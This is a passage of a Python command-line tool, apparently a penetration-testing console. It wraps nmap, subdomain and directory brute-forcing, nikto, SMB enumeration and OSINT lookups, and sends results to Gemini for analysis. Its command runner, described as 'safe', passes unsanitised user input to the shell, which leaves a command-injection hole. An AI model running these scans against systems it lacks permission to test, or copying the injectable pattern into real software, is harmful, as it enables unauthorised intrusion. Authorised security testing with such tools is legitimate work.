#!/usr/bin/env python3

import os
import sys
import json
import logging
import shutil
import subprocess
import requests
import re
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict, Any, List
from colorama import Fore, Back, Style, init
from dotenv import load_dotenv

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ptcenter.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class Colors:
    """Color scheme for the application"""
    HEADER = f"{Fore.CYAN}{Style.BRIGHT}"
    SUCCESS = f"{Fore.GREEN}{Style.BRIGHT}"
    WARNING = f"{Fore.YELLOW}{Style.BRIGHT}"
    ERROR = f"{Fore.RED}{Style.BRIGHT}"
    INFO = f"{Fore.BLUE}{Style.BRIGHT}"
    MENU = f"{Fore.MAGENTA}{Style.BRIGHT}"
    PROMPT = f"{Fore.WHITE}{Style.BRIGHT}"
    RESET = Style.RESET_ALL
    SEPARATOR = f"{Fore.GREEN}{Style.BRIGHT}{'=' * 75}{Style.RESET_ALL}"
    SUBSEPARATOR = f"{Fore.CYAN}{Style.DIM}{'-' * 75}{Style.RESET_ALL}"


# ============================================================================
# AI MODEL - GOOGLE GEMINI ONLY
# ============================================================================

class GeminiModel:
    """Google Gemini AI Model - Free Tier"""
    
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.client = None
        try:
            from google import genai
            from google.genai import types
            self.genai = genai
            self.types = types
            self.client = genai.Client(api_key=api_key)
            logger.info("Gemini AI client initialized successfully")
        except Exception as e:
            logger.error(f"Gemini initialization failed: {e}")
    
    def generate(self, prompt: str, system_instruction: str = "") -> Optional[str]:
        """Generate response from Gemini"""
        if not self.client:
            return None
        try:
            response = self.client.models.generate_content(
                model="gemini-3-flash-preview",
                contents=prompt,
                config=self.types.GenerateContentConfig(
                    system_instruction=system_instruction,
                    temperature=0.3
                )
            )
            return response.text
        except Exception as e:
            logger.error(f"Gemini generation error: {e}")
            return None
    
    def is_available(self) -> bool:
        """Check if Gemini is available"""
        return self.client is not None


# ============================================================================
# AI MANAGER - SIMPLIFIED FOR GEMINI ONLY
# ============================================================================

class AIManager:
    """Manages Gemini AI model"""
    
    def __init__(self):
        self.model: Optional[GeminiModel] = None
        self.load_model()
    
    def load_model(self):
        """Load Gemini AI model from environment"""
        load_dotenv()
        
        gemini_key = os.getenv("GEMINI_API_KEY")
        if gemini_key:
            self.model = GeminiModel(gemini_key)
            if self.model.is_available():
                logger.info("Gemini AI model loaded successfully")
            else:
                self.model = None
                logger.warning("Gemini API key found but initialization failed")
        else:
            logger.warning("GEMINI_API_KEY not found in environment")
    
    def generate(self, prompt: str, system_instruction: str = "") -> Optional[str]:
        """Generate response using Gemini"""
        if not self.model:
            return None
        return self.model.generate(prompt, system_instruction)
    
    def is_available(self) -> bool:
        """Check if Gemini is available"""
        return self.model is not None and self.model.is_available()


# ============================================================================
# MAIN APPLICATION CLASS
# ============================================================================

class PTCenter:
    """Main penetration testing center class"""
    
    def __init__(self):
        """Initialize the PTCenter application"""
        self.output_dir = Path("/tmp/ptcenter_outputs")
        self.output_dir.mkdir(exist_ok=True)
        self.ai_manager = AIManager()
        self.config = self.load_config()
        
    def load_config(self) -> Dict[str, Any]:
        """Load or create configuration file"""
        config_file = Path.home() / ".ptcenter_config.json"
        default_config = {
            "output_directory": str(self.output_dir),
            "timeout": 300,
            "auto_ai_analysis": True,
            "save_logs": True
        }
        
        if config_file.exists():
            try:
                with open(config_file, 'r') as f:
                    return json.load(f)
            except:
                return default_config
        else:
            with open(config_file, 'w') as f:
                json.dump(default_config, f, indent=4)
            return default_config
    
    def check_tool_installed(self, tool_name: str) -> bool:
        """Check if a required tool is installed"""
        return shutil.which(tool_name) is not None
    
    def run_command(self, command: str, output_file: Optional[str] = None, 
                    timeout: int = 300) -> tuple[bool, str]:
        """
        Execute a shell command safely
        
        Args:
            command: Command to execute
            output_file: Optional file to save output
            timeout: Command timeout in seconds
            
        Returns:
            Tuple of (success, output/error_message)
        """
        try:
            print(f"{Colors.INFO}▶ Executing: {command}")
            
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(result.stdout)
                    if result.stderr:
                        f.write("\n\n=== ERRORS ===\n")
                        f.write(result.stderr)
            
            if result.returncode == 0:
                print(f"{Colors.SUCCESS}✓ Command completed successfully")
                return True, result.stdout
            else:
                print(f"{Colors.ERROR}✗ Command failed with return code {result.returncode}")
                logger.error(f"Command failed: {command}\n{result.stderr}")
                return False, result.stderr
                
        except subprocess.TimeoutExpired:
            error_msg = f"Command timed out after {timeout} seconds"
            print(f"{Colors.ERROR}✗ {error_msg}")
            logger.error(f"Timeout: {command}")
            return False, error_msg
            
        except Exception as e:
            error_msg = f"Error executing command: {str(e)}"
            print(f"{Colors.ERROR}✗ {error_msg}")
            logger.error(f"Command execution error: {e}")
            return False, error_msg
    
    def analyze_with_ai(self, scan_result: str, scan_type: str) -> Optional[str]:
        """
        Analyze scan results using Gemini AI
        
        Args:
            scan_result: The scan output to analyze
            scan_type: Type of scan performed
            
        Returns:
            AI analysis or None if AI is unavailable
        """
        if not self.ai_manager.is_available():
            print(f"{Colors.WARNING}⚠ AI analysis unavailable (GEMINI_API_KEY not configured)")
            return None
            
        try:
            print(f"{Colors.INFO}🤖 Analyzing results with Gemini AI...")
            
            prompt = f"""Analyze this {scan_type} scan result and provide:
1. Executive Summary (2-3 sentences)
2. Identified vulnerabilities or security issues
3. Risk Assessment (Critical/High/Medium/Low for each finding)
4. Recommended next steps and mitigation strategies
5. Additional reconnaissance suggestions

Format the output for terminal display with clear sections.

Scan Results:
{scan_result[:8000]}
"""
            
            system_instruction = """You are an expert penetration tester and security analyst. 
Provide clear, actionable security analysis. Be concise but thorough. 
Highlight critical issues and provide practical remediation steps."""
            
            analysis = self.ai_manager.generate(prompt, system_instruction)
            
            if analysis:
                print(f"{Colors.SUCCESS}✓ AI analysis completed")
            return analysis
            
        except Exception as e:
            print(f"{Colors.ERROR}✗ AI analysis failed: {e}")
            logger.error(f"AI analysis error: {e}")
            return None
    
    # ========================================================================
    # SCANNER MODULE
    # ========================================================================
    
    def scanner_menu(self):
        """Display and handle scanner options"""
        while True:
            print(f"\n{Colors.SEPARATOR}")
            print(f"{Colors.HEADER}           🔍 SCANNING MODULE{Colors.RESET}")
            print(Colors.SEPARATOR)
            print(f"""
{Colors.MENU}1{Colors.RESET} - Nmap Port Scan
{Colors.MENU}2{Colors.RESET} - Subdomain Discovery (Sublist3r/Amass)
{Colors.MENU}3{Colors.RESET} - Directory Brute Force (Dirb/Gobuster)
{Colors.MENU}4{Colors.RESET} - Web Application Scan (Nikto)
{Colors.MENU}5{Colors.RESET} - SSL/TLS Analysis (SSLScan)
{Colors.MENU}6{Colors.RESET} - DNS Enumeration
{Colors.MENU}7{Colors.RESET} - SMB Enumeration
{Colors.MENU}8{Colors.RESET} - Back to Main Menu
""")
            print(Colors.SUBSEPARATOR)
            
            choice = input(f"{Colors.PROMPT}[+] Select option: {Colors.RESET}").strip()
            
            if choice == "1":
                self.nmap_scan()
            elif choice == "2":
                self.subdomain_scan()
            elif choice == "3":
                self.directory_brute_force()
            elif choice == "4":
                self.nikto_scan()
            elif choice == "5":
                self.ssl_scan()
            elif choice == "6":
                self.dns_enumeration()
            elif choice == "7":
                self.smb_enumeration()
            elif choice == "8":
                break
            else:
                print(f"{Colors.ERROR}✗ Invalid option")
    
    def nmap_scan(self):
        """Perform Nmap scan"""
        if not self.check_tool_installed("nmap"):
            print(f"{Colors.ERROR}✗ Nmap is not installed")
            print(f"{Colors.INFO}Install: sudo apt install nmap")
            return
        
        print(f"\n{Colors.HEADER}🔍 Nmap Port Scanner{Colors.RESET}")
        target = input(f"{Colors.PROMPT}[+] Enter target IP/Domain/Range: {Colors.RESET}").strip()
        
        if not target:
            print(f"{Colors.ERROR}✗ Target cannot be empty")
            return
        
        print(f"\n{Colors.INFO}Scan Profiles:")
        print(f"{Colors.MENU}1{Colors.RESET} - Quick Scan (Top 100 ports)")
        print(f"{Colors.MENU}2{Colors.RESET} - Full TCP Scan (All 65535 ports)")
        print(f"{Colors.MENU}3{Colors.RESET} - Service Detection (-sV)")
        print(f"{Colors.MENU}4{Colors.RESET} - OS Detection (-O, requires sudo)")
        print(f"{Colors.MENU}5{Colors.RESET} - Aggressive Scan (-A)")
        print(f"{Colors.MENU}6{Colors.RESET} - Stealth SYN Scan (-sS, requires sudo)")
        print(f"{Colors.MENU}7{Colors.RESET} - UDP Scan (-sU, requires sudo)")
        print(f"{Colors.MENU}8{Colors.RESET} - Vulnerability Scan (--script vuln)")
        print(f"{Colors.MENU}9{Colors.RESET} - Custom")
        
        scan_type = input(f"\n{Colors.PROMPT}[+] Select scan profile [1-9]: {Colors.RESET}").strip()
        
        scan_options = {
            "1": "-F -T4",
            "2": "-p- -T4",
            "3": "-sV -T4",
            "4": "-O -T4",
            "5": "-A -T4",
            "6": "-sS -T4",
            "7": "-sU -T4",
            "8": "--script vuln -T4",
        }
        
        if scan_type in scan_options:
            nmap_flags = scan_options[scan_type]
        elif scan_type == "9":
            nmap_flags = input(f"{Colors.PROMPT}[+] Enter custom nmap flags: {Colors.RESET}").strip()
        else:
            nmap_flags = "-sC -sV -T4"
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"nmap_{target.replace('/', '_')}_{timestamp}.txt"
        
        command = f"nmap {nmap_flags} -oN {output_file} {target}"
        success, result = self.run_command(command, str(output_file))
        
        if success and output_file.exists():
            with open(output_file, 'r') as f:
                scan_result = f.read()
            
            print(f"\n{Colors.SUCCESS}{'=' * 75}")
            print(f"{Colors.SUCCESS}SCAN RESULTS")
            print(f"{Colors.SUCCESS}{'=' * 75}{Colors.RESET}")
            print(scan_result)
            
            # AI Analysis
            if self.config.get("auto_ai_analysis", True) and self.ai_manager.is_available():
                analysis = self.analyze_with_ai(scan_result, "Nmap")
                if analysis:
                    print(f"\n{Colors.HEADER}{'=' * 75}")
                    print(f"{Colors.HEADER}🤖 AI SECURITY ANALYSIS")
                    print(f"{Colors.HEADER}{'=' * 75}{Colors.RESET}")
                    print(analysis)
                    
                    # Save analysis
                    analysis_file = self.output_dir / f"nmap_analysis_{timestamp}.txt"
                    with open(analysis_file, 'w') as f:
                        f.write(analysis)
            
            print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    def subdomain_scan(self):
        """Perform subdomain enumeration"""
        print(f"\n{Colors.HEADER}🌐 Subdomain Discovery{Colors.RESET}")
        
        # Check available tools
        has_sublist3r = self.check_tool_installed("sublist3r")
        has_amass = self.check_tool_installed("amass")
        has_subfinder = self.check_tool_installed("subfinder")
        
        if not (has_sublist3r or has_amass or has_subfinder):
            print(f"{Colors.ERROR}✗ No subdomain enumeration tools installed")
            print(f"{Colors.INFO}Install options:")
            print(f"  - pip install sublist3r")
            print(f"  - sudo apt install amass")
            print(f"  - go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
            return
        
        domain = input(f"{Colors.PROMPT}[+] Enter domain: {Colors.RESET}").strip()
        
        if not domain:
            print(f"{Colors.ERROR}✗ Domain cannot be empty")
            return
        
        print(f"\n{Colors.INFO}Available Tools:")
        if has_sublist3r:
            print(f"{Colors.MENU}1{Colors.RESET} - Sublist3r (Fast, uses search engines)")
        if has_amass:
            print(f"{Colors.MENU}2{Colors.RESET} - Amass (Comprehensive, slower)")
        if has_subfinder:
            print(f"{Colors.MENU}3{Colors.RESET} - Subfinder (Fast, passive)")
        print(f"{Colors.MENU}4{Colors.RESET} - Use all available tools")
        
        tool_choice = input(f"\n{Colors.PROMPT}[+] Select tool: {Colors.RESET}").strip()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"subdomains_{domain}_{timestamp}.txt"
        
        commands = []
        if tool_choice == "1" and has_sublist3r:
            commands.append(f"sublist3r -d {domain} -o {output_file}")
        elif tool_choice == "2" and has_amass:
            commands.append(f"amass enum -passive -d {domain} -o {output_file}")
        elif tool_choice == "3" and has_subfinder:
            commands.append(f"subfinder -d {domain} -o {output_file}")
        elif tool_choice == "4":
            if has_sublist3r:
                commands.append(f"sublist3r -d {domain} -o {output_file}.sublist3r")
            if has_amass:
                commands.append(f"amass enum -passive -d {domain} -o {output_file}.amass")
            if has_subfinder:
                commands.append(f"subfinder -d {domain} -o {output_file}.subfinder")
        
        for cmd in commands:
            success, result = self.run_command(cmd)
        
        # Combine results if multiple tools used
        if tool_choice == "4" and len(commands) > 1:
            all_subdomains = set()
            for ext in ['sublist3r', 'amass', 'subfinder']:
                file = Path(f"{output_file}.{ext}")
                if file.exists():
                    with open(file, 'r') as f:
                        all_subdomains.update(line.strip() for line in f if line.strip())
            
            with open(output_file, 'w') as f:
                for subdomain in sorted(all_subdomains):
                    f.write(f"{subdomain}\n")
        
        if output_file.exists():
            with open(output_file, 'r') as f:
                subdomains = f.read()
            
            print(f"\n{Colors.SUCCESS}✓ Subdomains found:")
            print(subdomains)
            print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    def directory_brute_force(self):
        """Perform directory brute forcing"""
        has_dirb = self.check_tool_installed("dirb")
        has_gobuster = self.check_tool_installed("gobuster")
        has_dirsearch = self.check_tool_installed("dirsearch")
        
        if not (has_dirb or has_gobuster or has_dirsearch):
            print(f"{Colors.ERROR}✗ No directory brute force tools installed")
            print(f"{Colors.INFO}Install: sudo apt install dirb gobuster")
            return
        
        print(f"\n{Colors.HEADER}📁 Directory Brute Force{Colors.RESET}")
        url = input(f"{Colors.PROMPT}[+] Enter target URL: {Colors.RESET}").strip()
        
        if not url:
            print(f"{Colors.ERROR}✗ URL cannot be empty")
            return
        
        print(f"\n{Colors.INFO}Select Tool:")
        if has_gobuster:
            print(f"{Colors.MENU}1{Colors.RESET} - Gobuster (Fast)")
        if has_dirb:
            print(f"{Colors.MENU}2{Colors.RESET} - Dirb (Classic)")
        if has_dirsearch:
            print(f"{Colors.MENU}3{Colors.RESET} - Dirsearch (Feature-rich)")
        
        tool_choice = input(f"\n{Colors.PROMPT}[+] Select tool: {Colors.RESET}").strip()
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"directories_{timestamp}.txt"
        
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        
        if tool_choice == "1" and has_gobuster:
            command = f"gobuster dir -u {url} -w {wordlist} -o {output_file} -q"
        elif tool_choice == "2" and has_dirb:
            command = f"dirb {url} {wordlist} -o {output_file}"
        elif tool_choice == "3" and has_dirsearch:
            command = f"dirsearch -u {url} -o {output_file}"
        else:
            print(f"{Colors.ERROR}✗ Invalid selection")
            return
        
        success, result = self.run_command(command, str(output_file))
        
        if success:
            print(f"\n{Colors.SUCCESS}✓ Scan completed")
            print(f"{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    def nikto_scan(self):
        """Perform Nikto web server scan"""
        if not self.check_tool_installed("nikto"):
            print(f"{Colors.ERROR}✗ Nikto is not installed")
            print(f"{Colors.INFO}Install: sudo apt install nikto")
            return
        
        print(f"\n{Colors.HEADER}🔎 Nikto Web Scanner{Colors.RESET}")
        target = input(f"{Colors.PROMPT}[+] Enter target URL/IP: {Colors.RESET}").strip()
        
        if not target:
            print(f"{Colors.ERROR}✗ Target cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"nikto_{timestamp}.txt"
        
        command = f"nikto -h {target} -o {output_file}"
        success, result = self.run_command(command, str(output_file), timeout=600)
        
        if success and output_file.exists():
            with open(output_file, 'r') as f:
                scan_result = f.read()
            
            print(f"\n{Colors.SUCCESS}{'=' * 75}")
            print(scan_result)
            print(f"{Colors.SUCCESS}{'=' * 75}{Colors.RESET}")
            
            # AI Analysis
            if self.ai_manager.is_available():
                analysis = self.analyze_with_ai(scan_result, "Nikto Web")
                if analysis:
                    print(f"\n{Colors.HEADER}🤖 AI Analysis:\n{Colors.RESET}{analysis}")
            
            print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    def ssl_scan(self):
        """Perform SSL/TLS security analysis"""
        if not self.check_tool_installed("sslscan"):
            print(f"{Colors.ERROR}✗ SSLScan is not installed")
            print(f"{Colors.INFO}Install: sudo apt install sslscan")
            return
        
        print(f"\n{Colors.HEADER}🔒 SSL/TLS Security Analysis{Colors.RESET}")
        target = input(f"{Colors.PROMPT}[+] Enter domain/IP: {Colors.RESET}").strip()
        
        if not target:
            print(f"{Colors.ERROR}✗ Target cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"sslscan_{timestamp}.txt"
        
        command = f"sslscan {target} | tee {output_file}"
        success, result = self.run_command(command)
        
        if success:
            print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    def dns_enumeration(self):
        """Perform DNS enumeration"""
        print(f"\n{Colors.HEADER}🔍 DNS Enumeration{Colors.RESET}")
        domain = input(f"{Colors.PROMPT}[+] Enter domain: {Colors.RESET}").strip()
        
        if not domain:
            print(f"{Colors.ERROR}✗ Domain cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"dns_{domain}_{timestamp}.txt"
        
        print(f"\n{Colors.INFO}Performing DNS lookups...")
        
        dns_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        with open(output_file, 'w') as f:
            for record_type in dns_types:
                print(f"{Colors.INFO}▶ Querying {record_type} records...")
                command = f"dig {domain} {record_type} +short"
                success, result = self.run_command(command)
                if success and result:
                    f.write(f"\n=== {record_type} Records ===\n{result}\n")
                    print(result)
        
        # Try zone transfer
        print(f"\n{Colors.INFO}▶ Attempting zone transfer...")
        command = f"dig axfr @{domain} {domain}"
        success, result = self.run_command(command)
        if success and "Transfer failed" not in result:
            with open(output_file, 'a') as f:
                f.write(f"\n=== Zone Transfer ===\n{result}\n")
        
        print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    def smb_enumeration(self):
        """Perform SMB enumeration"""
        if not self.check_tool_installed("enum4linux"):
            print(f"{Colors.ERROR}✗ enum4linux is not installed")
            print(f"{Colors.INFO}Install: sudo apt install enum4linux")
            return
        
        print(f"\n{Colors.HEADER}🗂️  SMB Enumeration{Colors.RESET}")
        target = input(f"{Colors.PROMPT}[+] Enter target IP: {Colors.RESET}").strip()
        
        if not target:
            print(f"{Colors.ERROR}✗ Target cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"smb_{target}_{timestamp}.txt"
        
        command = f"enum4linux -a {target} | tee {output_file}"
        success, result = self.run_command(command, timeout=600)
        
        if success:
            print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    # ========================================================================
    # OSINT MODULE
    # ========================================================================
    
    def osint_menu(self):
        """OSINT investigation module"""
        while True:
            print(f"\n{Colors.SEPARATOR}")
            print(f"{Colors.HEADER}           🔍 OSINT MODULE{Colors.RESET}")
            print(Colors.SEPARATOR)
            print(f"""
{Colors.MENU}1{Colors.RESET} - Email/Username Intelligence
{Colors.MENU}2{Colors.RESET} - Domain/IP Intelligence
{Colors.MENU}3{Colors.RESET} - Phone Number Lookup
{Colors.MENU}4{Colors.RESET} - Social Media Search
{Colors.MENU}5{Colors.RESET} - Metadata Extraction
{Colors.MENU}6{Colors.RESET} - WHOIS Lookup
{Colors.MENU}7{Colors.RESET} - Shodan Search
{Colors.MENU}8{Colors.RESET} - Back to Main Menu
""")
            print(Colors.SUBSEPARATOR)
            
            choice = input(f"{Colors.PROMPT}[+] Select option: {Colors.RESET}").strip()
            
            if choice == "1":
                self.email_intelligence()
            elif choice == "2":
                self.domain_intelligence()
            elif choice == "3":
                self.phone_lookup()
            elif choice == "4":
                self.social_media_search()
            elif choice == "5":
                self.metadata_extraction()
            elif choice == "6":
                self.whois_lookup()
            elif choice == "7":
                self.shodan_search()
            elif choice == "8":
                break
            else:
                print(f"{Colors.ERROR}✗ Invalid option")
    
    def email_intelligence(self):
        """Gather intelligence on email/username"""
        print(f"\n{Colors.HEADER}📧 Email/Username Intelligence{Colors.RESET}")
        query = input(f"{Colors.PROMPT}[+] Enter email/username: {Colors.RESET}").strip()
        
        if not query:
            print(f"{Colors.ERROR}✗ Input cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"osint_email_{timestamp}.txt"
        
        with open(output_file, 'w') as f:
            f.write(f"Email/Username OSINT Report\n")
            f.write(f"Target: {query}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write("=" * 75 + "\n\n")
            
            # Check if it's an email
            if '@' in query:
                email_parts = query.split('@')
                f.write(f"Email Components:\n")
                f.write(f"  Username: {email_parts[0]}\n")
                f.write(f"  Domain: {email_parts[1]}\n\n")
                
                # Check email format validity
                email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
                if re.match(email_regex, query):
                    f.write("✓ Valid email format\n\n")
                else:
                    f.write("✗ Invalid email format\n\n")
            
            # Check for leaked credentials using AI
            if self.ai_manager.is_available():
                print(f"{Colors.INFO}🤖 Analyzing with AI...")
                prompt = f"""Provide OSINT intelligence about this identifier: {query}
                
Include:
1. Possible sources to check for public information
2. Common platforms where this identifier might be found
3. Security considerations and breach databases to check
4. Recommended OSINT tools and techniques
5. Legal and ethical considerations

Keep it practical and actionable."""
                
                analysis = self.ai_manager.generate(prompt, 
                    "You are an OSINT expert. Provide practical, ethical guidance.")
                
                if analysis:
                    f.write("=== AI OSINT Analysis ===\n")
                    f.write(analysis + "\n\n")
                    print(f"\n{Colors.INFO}{analysis}{Colors.RESET}")
        
        print(f"\n{Colors.SUCCESS}✓ OSINT report saved to: {output_file}{Colors.RESET}")
        
        # Suggest tools
        print(f"\n{Colors.INFO}Recommended Tools:")
        print("  - Sherlock: python3 sherlock username")
        print("  - Holehe: holehe email@example.com")
        print("  - Have I Been Pwned: https://haveibeenpwned.com/")
        print("  - Hunter.io: https://hunter.io/")
    
    def domain_intelligence(self):
        """Gather intelligence on domain/IP"""
        print(f"\n{Colors.HEADER}🌐 Domain/IP Intelligence{Colors.RESET}")
        target = input(f"{Colors.PROMPT}[+] Enter domain/IP: {Colors.RESET}").strip()
        
        if not target:
            print(f"{Colors.ERROR}✗ Target cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"osint_domain_{timestamp}.txt"
        
        with open(output_file, 'w') as f:
            f.write(f"Domain/IP Intelligence Report\n")
            f.write(f"Target: {target}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write("=" * 75 + "\n\n")
            
            # DNS lookup
            print(f"{Colors.INFO}▶ Performing DNS lookup...")
            command = f"dig {target} +short"
            success, result = self.run_command(command)
            if success:
                f.write("=== DNS Resolution ===\n")
                f.write(result + "\n\n")
            
            # WHOIS
            print(f"{Colors.INFO}▶ Performing WHOIS lookup...")
            command = f"whois {target}"
            success, result = self.run_command(command)
            if success:
                f.write("=== WHOIS Information ===\n")
                f.write(result + "\n\n")
            
            # Reverse DNS
            print(f"{Colors.INFO}▶ Reverse DNS lookup...")
            command = f"dig -x {target} +short"
            success, result = self.run_command(command)
            if success and result:
                f.write("=== Reverse DNS ===\n")
                f.write(result + "\n\n")
        
        print(f"\n{Colors.SUCCESS}✓ Intelligence report saved to: {output_file}{Colors.RESET}")
    
    def phone_lookup(self):
        """Phone number OSINT"""
        print(f"\n{Colors.HEADER}📱 Phone Number Lookup{Colors.RESET}")
        phone = input(f"{Colors.PROMPT}[+] Enter phone number (with country code): {Colors.RESET}").strip()
        
        if not phone:
            print(f"{Colors.ERROR}✗ Phone number cannot be empty")
            return
        
        print(f"\n{Colors.INFO}Phone Number Analysis:")
        print(f"  Number: {phone}")
        
        # Basic validation
        if phone.startswith('+'):
            print(f"  {Colors.SUCCESS}✓ International format detected")
        else:
            print(f"  {Colors.WARNING}⚠ Consider using international format (+country_code)")
        
        print(f"\n{Colors.INFO}Recommended Resources:")
        print("  - TrueCaller: https://www.truecaller.com/")
        print("  - Phone Validator: Various online services")
        print("  - Country Code Lookup: https://countrycode.org/")
    
    def social_media_search(self):
        """Social media OSINT"""
        print(f"\n{Colors.HEADER}🔍 Social Media Search{Colors.RESET}")
        username = input(f"{Colors.PROMPT}[+] Enter username: {Colors.RESET}").strip()
        
        if not username:
            print(f"{Colors.ERROR}✗ Username cannot be empty")
            return
        
        platforms = [
            ("Twitter/X", f"https://twitter.com/{username}"),
            ("Instagram", f"https://instagram.com/{username}"),
            ("GitHub", f"https://github.com/{username}"),
            ("LinkedIn", f"https://linkedin.com/in/{username}"),
            ("Facebook", f"https://facebook.com/{username}"),
            ("Reddit", f"https://reddit.com/user/{username}"),
            ("TikTok", f"https://tiktok.com/@{username}"),
            ("YouTube", f"https://youtube.com/@{username}"),
        ]
        
        print(f"\n{Colors.INFO}Profile URLs to check:")
        for platform, url in platforms:
            print(f"  {Colors.MENU}►{Colors.RESET} {platform}: {url}")
        
        print(f"\n{Colors.INFO}Recommended Tools:")
        print("  - Sherlock: https://github.com/sherlock-project/sherlock")
        print("  - Maigret: https://github.com/soxoj/maigret")
        print("  - Social Analyzer: https://github.com/qeeqbox/social-analyzer")
    
    def metadata_extraction(self):
        """Extract metadata from files"""
        print(f"\n{Colors.HEADER}📄 Metadata Extraction{Colors.RESET}")
        
        if not self.check_tool_installed("exiftool"):
            print(f"{Colors.ERROR}✗ ExifTool is not installed")
            print(f"{Colors.INFO}Install: sudo apt install exiftool")
            return
        
        file_path = input(f"{Colors.PROMPT}[+] Enter file path: {Colors.RESET}").strip()
        
        if not file_path or not Path(file_path).exists():
            print(f"{Colors.ERROR}✗ File not found")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"metadata_{timestamp}.txt"
        
        command = f"exiftool {file_path} | tee {output_file}"
        success, result = self.run_command(command)
        
        if success:
            print(f"\n{Colors.SUCCESS}✓ Metadata saved to: {output_file}{Colors.RESET}")
    
    def whois_lookup(self):
        """Perform WHOIS lookup"""
        print(f"\n{Colors.HEADER}🔍 WHOIS Lookup{Colors.RESET}")
        target = input(f"{Colors.PROMPT}[+] Enter domain/IP: {Colors.RESET}").strip()
        
        if not target:
            print(f"{Colors.ERROR}✗ Target cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"whois_{target}_{timestamp}.txt"
        
        command = f"whois {target} | tee {output_file}"
        success, result = self.run_command(command)
        
        if success:
            print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    def shodan_search(self):
        """Shodan search"""
        print(f"\n{Colors.HEADER}🔍 Shodan Search{Colors.RESET}")
        
        if not self.check_tool_installed("shodan"):
            print(f"{Colors.ERROR}✗ Shodan CLI is not installed")
            print(f"{Colors.INFO}Install: pip install shodan")
            print(f"{Colors.INFO}Then set API key: shodan init YOUR_API_KEY")
            return
        
        query = input(f"{Colors.PROMPT}[+] Enter search query: {Colors.RESET}").strip()
        
        if not query:
            print(f"{Colors.ERROR}✗ Query cannot be empty")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"shodan_{timestamp}.txt"
        
        command = f"shodan search {query} | tee {output_file}"
        success, result = self.run_command(command)
        
        if success:
            print(f"\n{Colors.SUCCESS}✓ Results saved to: {output_file}{Colors.RESET}")
    
    # ========================================================================
    # VULNERABILITY INFO MODULE
    # ========================================================================
    
    def vulnerability_info(self):
        """Get information about vulnerabilities"""
        print(f"\n{Colors.HEADER}🛡️  Vulnerability Information{Colors.RESET}")
        
        vuln_id = input(f"{Colors.PROMPT}[+] Enter CVE ID or vulnerability name: {Colors.RESET}").strip()
        
        if not vuln_id:
            print(f"{Colors.ERROR}✗ Input cannot be empty")
            return
        
        # Try to fetch from NVD if it's a CVE
        if vuln_id.upper().startswith("CVE-"):
            self.fetch_cve_info(vuln_id)
        
        # AI Analysis
        if self.ai_manager.is_available():
            try:
                print(f"\n{Colors.INFO}🤖 Analyzing vulnerability with AI...")
                
                prompt = f"""Provide comprehensive security analysis for: {vuln_id}

Include:
1. Vulnerability Description and Technical Details
2. Affected Systems/Software/Versions
3. CVSS Score and Severity Rating
4. Attack Vector and Complexity
5. Potential Impact (Confidentiality, Integrity, Availability)
6. Exploitation Status (Known exploits, PoCs, active exploitation)
7. Mitigation Strategies and Patches
8. Detection Methods
9. Related Vulnerabilities
10. Security Recommendations

Format for terminal display with clear sections."""
                
                response = self.ai_manager.generate(
                    prompt,
                    "You are a cybersecurity expert specializing in vulnerability analysis. Provide accurate, detailed, and actionable information."
                )
                
                if response:
                    print(f"\n{Colors.SUCCESS}{'=' * 75}")
                    print(f"{Colors.HEADER}🤖 AI VULNERABILITY ANALYSIS{Colors.RESET}")
                    print(f"{Colors.SUCCESS}{'=' * 75}{Colors.RESET}")
                    print(response)
                    
                    # Save analysis
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_file = self.output_dir / f"vuln_analysis_{vuln_id.replace('/', '_')}_{timestamp}.txt"
                    with open(output_file, 'w') as f:
                        f.write(f"Vulnerability Analysis Report\n")
                        f.write(f"Target: {vuln_id}\n")
